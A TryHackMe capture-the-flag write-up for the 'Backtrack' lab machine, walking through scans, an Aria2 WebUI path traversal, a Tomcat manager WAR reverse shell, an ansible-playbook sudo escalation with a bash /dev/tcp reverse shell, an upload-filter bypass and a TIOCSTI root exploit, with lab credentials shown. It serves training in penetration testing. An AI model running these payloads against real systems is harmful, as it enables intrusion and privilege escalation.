@@ -1,0 +1,325 @@
+Today we are back with another TryHackMe Challenge which is medium listed and linux based machine to pentest named backtrack.
+
+We are also given an IP :: 10.49.182.39
+
+So let's start with an all port scan here.
+
+Nmap scan report for ip-10-49-182-39.ap-south-1.compute.internal (10.49.182.39)
+Host is up, received echo-reply ttl 64 (0.0061s latency).
+Scanned at 2026-11-04 02:04:40 UTC for 4s
+Not shown: 65531 closed tcp ports (reset)
+PORT     STATE SERVICE        REASON
+22/tcp   open  ssh            syn-ack ttl 64
+6800/tcp open  unknown        syn-ack ttl 64
+8080/tcp open  http-proxy     syn-ack ttl 64
+8888/tcp open  sun-answerbook syn-ack ttl 64
+
+Let's continue with service and version detection scan here.
+
+Nmap scan report for 10.49.182.39
+Host is up, received echo-reply ttl 62 (0.066s latency).
+Scanned at 2026-11-04 02:09:15 UTC for 17s
+
+PORT     STATE SERVICE         REASON         VERSION
+22/tcp   open  ssh             syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 55:41:5a:65:e3:d8:c2:4f:59:a1:68:b6:79:8a:e3:fb (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDzPMYVGNn9fk2sUO4qG8t3GP/3ztCkoIRFTSFwnaHtRTiIe8s3ulwJkAyTZHSmedBOMihmyWyEmA44uxY4kUZEiba8R+c7aWHjTvD04VcKWPgVg1URPWMTHyxUcwKGnoh8n6VwM283+/4f2g2GSj2pVbacoV3xfDo8L4PshyfHK7dEd2qnQv9Yge3p5Aw/1Q7w1eaMZnaoicgzDgjhvqrRcS/DRcp3Lwoz6fGQW2/vFxW7d5aisTslKxRPslTy/Vrgprb7I+D9kdGEFqW/DXDfZLo+4O0woecE6+qSYPbIAjvIao25MTR8xHOFR0sCtyVfehEXYxvJ0fsqBG4yp/y15eDT3MSYevdvhHH1ZLejV66zILbPqUhzFBuMW1U6PKvSNPiQdzlnIRpD8ZQN7KJI8Y6zlHgoh8iu7+PgcUQNixYrX1GhMCYwNGHQlLOLriVRzhScZV3ObH1V8+g8I2sc3WZ54G2XUqZX+pN3ugjN1L5mo8mht1m7ZME+W9if37U=
+|   256 79:8a:12:64:cc:5c:d2:b7:38:dd:4f:07:76:4f:92:e2 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJfVuy7uiXVmzWVPtY/BYF+RZF36ZR8rh7wxeZi7yeOdWd06henZf8z5rYfalc0YHr6kE3clVa0jq+pF64w/lso=
+|   256 ce:e2:28:01:5f:0f:6a:77:df:1e:0a:79:df:9a:54:47 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHMk87a1jTdUzEWZNm/XtZKIto5reBlJr75kFdCKXscp
+6800/tcp open  http            syn-ack ttl 62 aria2 downloader JSON-RPC
+|_http-title: Site doesn't have a title.
+| http-methods: 
+|_  Supported Methods: OPTIONS
+8080/tcp open  http            syn-ack ttl 62 Apache Tomcat 8.5.93
+|_http-favicon: Apache Tomcat
+|_http-title: Apache Tomcat/8.5.93
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+8888/tcp open  sun-answerbook? syn-ack ttl 62
+| fingerprint-strings: 
+|   GetRequest, HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Content-Type: text/html
+|     Date: Wed, 04 Nov 2026 02:09:21 GMT
+|     Connection: close
+|     <!doctype html>
+|     <html>
+|     <!-- {{{ head -->
+|     <head>
+|     <link rel="icon" href="../favicon.ico" />
+|     <meta charset="utf-8">
+|     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+|     <meta name="theme-color" content="#0A8476">
+|     <title ng-bind="$root.pageTitle">Aria2 WebUI</title>
+|     <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Lato:400,700">
+|     <link href="app.css" rel="stylesheet"><script type="text/javascript" src="vendor.js"></script><script type="text/javascript" src="app.js"></script></head>
+|     <!-- }}} -->
+|     <body ng-controller="MainCtrl" ng-cloak>
+|     <!-- {{{ Icons -->
+|_    <svg aria-hidden="true" style="position: absolute; width: 0; height: 0; overflow: hidden;" version="1.1" xm
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8888-TCP:V=7.99%I=7%D=11/4%Time=6AEA93D1%P=x86_64-pc-linux-gnu%r(Ge
+SF:tRequest,2BBC,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/html\r\n
+SF:Date:\x20Wed,\x2004\x20Nov\x202026\x2002:09:21\x20GMT\r\nConnection:\x2
+SF:0close\r\n\r\n<!doctype\x20html>\n<html>\n\n<!--\x20{{{\x20head\x20-->\
+SF:n<head>\n\x20\x20<link\x20rel=\"icon\"\x20href=\"\.\./favicon\.ico\"\x2
+SF:0/>\n\n\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20<meta\x20http-equiv
+SF:=\"X-UA-Compatible\"\x20content=\"IE=edge,chrome=1\">\n\x20\x20<meta\x2
+SF:0name=\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\
+SF:.0\">\n\x20\x20<meta\x20name=\"theme-color\"\x20content=\"#0A8476\">\n\
+SF:n\x20\x20<title\x20ng-bind=\"\$root\.pageTitle\">Aria2\x20WebUI</title>
+SF:\n\n\x20\x20<link\x20rel=\"stylesheet\"\x20type=\"text/css\"\x20href=\"
+SF:https://fonts\.googleapis\.com/css\?family=Lato:400,700\">\n\n<link\x20
+SF:href=\"app\.css\"\x20rel=\"stylesheet\"><script\x20type=\"text/javascri
+SF:pt\"\x20src=\"vendor\.js\"></script><script\x20type=\"text/javascript\"
+SF:\x20src=\"app\.js\"></script></head>\n<!--\x20}}}\x20-->\n\n<body\x20ng
+SF:-controller=\"MainCtrl\"\x20ng-cloak>\n\n<!--\x20{{{\x20Icons\x20-->\n<
+SF:svg\x20aria-hidden=\"true\"\x20style=\"position:\x20absolute;\x20width:
+SF:\x200;\x20height:\x200;\x20overflow:\x20hidden;\"\x20version=\"1\.1\"\x
+SF:20xm")%r(HTTPOptions,184C,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20t
+SF:ext/html\r\nDate:\x20Wed,\x2004\x20Nov\x202026\x2002:09:21\x20GMT\r\nCo
+SF:nnection:\x20close\r\n\r\n<!doctype\x20html>\n<html>\n\n<!--\x20{{{\x20
+SF:head\x20-->\n<head>\n\x20\x20<link\x20rel=\"icon\"\x20href=\"\.\./favic
+SF:on\.ico\"\x20/>\n\n\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20<meta\x
+SF:20http-equiv=\"X-UA-Compatible\"\x20content=\"IE=edge,chrome=1\">\n\x20
+SF:\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20init
+SF:ial-scale=1\.0\">\n\x20\x20<meta\x20name=\"theme-color\"\x20content=\"#
+SF:0A8476\">\n\n\x20\x20<title\x20ng-bind=\"\$root\.pageTitle\">Aria2\x20W
+SF:ebUI</title>\n\n\x20\x20<link\x20rel=\"stylesheet\"\x20type=\"text/css\
+SF:"\x20href=\"https://fonts\.googleapis\.com/css\?family=Lato:400,700\">\
+SF:n\n<link\x20href=\"app\.css\"\x20rel=\"stylesheet\"><script\x20type=\"t
+SF:ext/javascript\"\x20src=\"vendor\.js\"></script><script\x20type=\"text/
+SF:javascript\"\x20src=\"app\.js\"></script></head>\n<!--\x20}}}\x20-->\n\
+SF:n<body\x20ng-controller=\"MainCtrl\"\x20ng-cloak>\n\n<!--\x20{{{\x20Ico
+SF:ns\x20-->\n<svg\x20aria-hidden=\"true\"\x20style=\"position:\x20absolut
+SF:e;\x20width:\x200;\x20height:\x200;\x20overflow:\x20hidden;\"\x20versio
+SF:n=\"1\.1\"\x20xm");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+So here we see multiple open ports here which we will see around.
+
+Mostly ports look like web based ports for now so starting with the burpsuite here.
+
+Also we see that on port 6800 no request and then on port 8080 we will see the Apache Tomcat 8.5.93 and on port 8888 AriaWeb2UI so let's start with AriaWeb2UI for now it would work
+
+So there was an direct option which says to add things via URI on AriaWebpage 
+
+So we started a python server and after that we will get this out bound connection that downloads things.
+
+python3 -m http.server     
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.49.182.39 - - [04/Nov/2026 02:16:06] code 404, message File not found
+10.49.182.39 - - [04/Nov/2026 02:16:06] "GET /test.jpg HTTP/1.1" 404 -
+
+So this can be interesting in getting the shell partially if it worked.
+
+http://cc:8000/shell.php
+
+So with this we will get it on the website part.
+
+But this side didn't directly worked so from the webpage settings we came to know about Ariaweb2UI version and it is vulnerable to Path Traversal
+
+curl --path-as-is http://10.49.182.39:8888/../../../../../../../../../../../../../../../../../../../../opt/tomcat/conf/tomcat-users.xml
+
+
+So with the above payload we can try to get the user names from the tomcat file as intended.
+
+<?xml version="1.0" encoding="UTF-8"?>
+<tomcat-users xmlns="http://tomcat.apache.org/xml"
+              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
+              version="1.0">
+
+  <role rolename="manager-script"/>
+  <user username="tomcat" password="OPx52k53D8OkTZpx4fr" roles="manager-script"/>
+
+</tomcat-users>
+
+And with this we have tomcat:OPx52k53D8OkTZpx4fr user and password for now.
+
+As for now web interface is disable for this user but we can use it with curl for now.
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.136.156 LPORT=4444 -f war > shell.war
+Payload size: 1501 bytes
+
+So we generate our first payload for now.
+
+ curl -u 'tomcat:OPx52k53D8OkTZpx4fr' \
+http://10.49.182.39:8080/manager/text/list
+OK - Listed applications for virtual host [localhost]
+/:running:0:ROOT
+/rev:stopped:0:rev.war
+/opt:stopped:0:opt.war
+/examples:running:0:examples
+/reverse_shell:running:0:reverse_shell
+/host-manager:running:0:host-manager
+/shell:stopped:0:shell.war
+/manager:running:0:manager
+/docs:running:0:docs
+/tmp:stopped:0:tmp.war
+                        
+If you started to get the error.
+
+curl -u tomcat:OPx52k53D8OkTZpx4fr --upload-file ev.war "http://10.49.182.39:8080/manager/text/deploy?path=/shell&update=true"
+OK - Deployed application at context path [/shell]
+
+And with this one we have that path shared.
+
+└─# curl http://10.49.182.39:8080/shell/
+ with this we will be having shell.
+ 
+nc -lvnp 4444                      
+listening on [any] 4444 ...
+connect to [192.168.136.156] from (UNKNOWN) [10.49.182.39] 52148
+id
+uid=1002(tomcat) gid=1002(tomcat) groups=1002(tomcat)
+
+Let's stabilize the shell.
+
+which python3
+/usr/bin/python3
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+tomcat@Backtrack:/$ zst^Z
+zsh: suspended  nc -lvnp 4444
+                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# stty raw -echo          
+fg
+
+[1]  + continued  nc -lvnp 4444
+
+tomcat@Backtrack:/$ export TERM=xterm-256color
+tomcat@Backtrack:/$ 
+
+And here we have this all.
+
+/opt/tomcat/flag1.txt
+tomcat@Backtrack:/$ find / -type f -name "flag*" 2>/dev/null
+
+So we have the first flag for now.
+
+Then with sudo -l
+
+sudo -l
+Matching Defaults entries for tomcat on Backtrack:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User tomcat may run the following commands on Backtrack:
+    (wilbur) NOPASSWD: /usr/bin/ansible-playbook /opt/test_playbooks/*.yml
+
+We have this part.
+
+cat priv.yml                        
+- hosts: localhost
+  tasks:
+    - name: RShell
+      command: bash /tmp/wilbur.sh
+      
+Now with this file and then taking it to attacking machine on tmp directory
+
+echo '/bin/bash -i >& /dev/tcp/192.168.136.156/4445 0>&1' > /tmp/wilbur.sh
+
+tomcat@Backtrack:/tmp$ chmod 777 priv.yml 
+tomcat@Backtrack:/tmp$ echo '/bin/bash -i >& /dev/tcp/192.168.136.156/4445 0>&1' > /tmp/wilbur.sh
+tomcat@Backtrack:/tmp$ chmod +x wilbur.sh 
+tomcat@Backtrack:/tmp$ 
+
+So we have all this part for now.
+
+sudo -u wilbur /usr/bin/ansible-playbook /opt/test_playbooks/../../tmp/priv.yml
+
+And we will do this one.
+
+And with this one we will drop in to the wilbur shell
+
+nc -lvnp 4445          
+listening on [any] 4445 ...
+connect to [192.168.136.156] from (UNKNOWN) [10.49.166.200] 55578
+wilbur@Backtrack:/tmp$ 
+
+wilbur@Backtrack:/home$ cd wilbur/
+wilbur@Backtrack:~$ ls
+from_orville.txt
+wilbur@Backtrack:~$ cat from_orville.txt 
+Hey Wilbur, it's Orville. I just finished developing the image gallery web app I told you about last week, and it works just fine. However, I'd like you to test it yourself to see if everything works and secure.
+I've started the app locally so you can access it from here. I've disabled registrations for now because it's still in the testing phase. Here are the credentials you can use to log in:
+
+email : orville@backtrack.thm
+password : W34r3B3773r73nP3x3l$
+
+So we have a note from orville which would be interesting for now to pivot and tunnel
+
+tcp   LISTEN 0      511             127.0.0.1:80           0.0.0.0:*            
+ 
+And we got a port that is running over here.
+
+ssh -L 9999:127.0.0.1:80 kali@192.168.136.156
+The authenticity of host '192.168.136.156 (192.168.136.156)' can't be established.
+
+So let's port forward to our main machine and once we do this we drop into our own machine shell for now here.
+
+
+wilbur@Backtrack:~$ cat .just_in_case.txt 
+in case i forget :
+
+wilbur:mYe317Tb9qTNrWFND7KF
+
+Also we get this so we can now port forward.
+
+Now we did the port forwarding and then we have
+
+http://127.0.0.1:9999/
+this panel over here.
+
+Then we login with the orville credentials for now.
+
+And while uploading the file bypass with %252e%252e%252fshell.png.php a pentest reverse shell upload we will get the shell for orville
+
+nc -lvnp 5555
+listening on [any] 5555 ...
+connect to [192.168.136.156] from (UNKNOWN) [10.49.166.200] 38788
+Linux Backtrack 5.4.0-173-generic #191-Ubuntu SMP Fri Feb 2 13:55:07 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
+ 03:50:51 up 17 min,  1 user,  load average: 1.38, 0.61, 0.34
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+wilbur   pts/2    192.168.136.156  03:49    1:24   0.02s  0.02s -bash
+uid=1003(orville) gid=1003(orville) groups=1003(orville)
+bash: cannot set terminal process group (692): Inappropriate ioctl for device
+bash: no job control in this shell
+orville@Backtrack:/$ 
+
+orville@Backtrack:/home/orville$ pwd
+/home/orville
+orville@Backtrack:/home/orville$ ls
+flag2.txt  web_snapshot.zip
+orville@Backtrack:/home/orville$ cat flag2.txt
+
+So here we have for now.
+
+So with this we are able to know with pspy64 that there is backend task running that shows alot of screen session to exit this
+
+We will have a python script for this one.
+
+	#!/usr/bin/env python3
+	import fcntl
+	import termios
+	import os
+	import signal
+	
+	os.kill(os.getppid(), signal.SIGSTOP)
+	
+	for char in 'chmod +s /bin/bash\n':
+	    fcntl.ioctl(0, termios.TIOCSTI, char)
+
+echo 'python3 /dev/shm/backtoroot.py' >> .bashrc
+
+orville@Backtrack:/home/orville$ bash -p
+bash-5.0# id
+uid=1003(orville) gid=1003(orville) euid=0(root) egid=0(root) groups=0(root),1003(orville)
+bash-5.0# cat /root/flag3.txt 
+
+
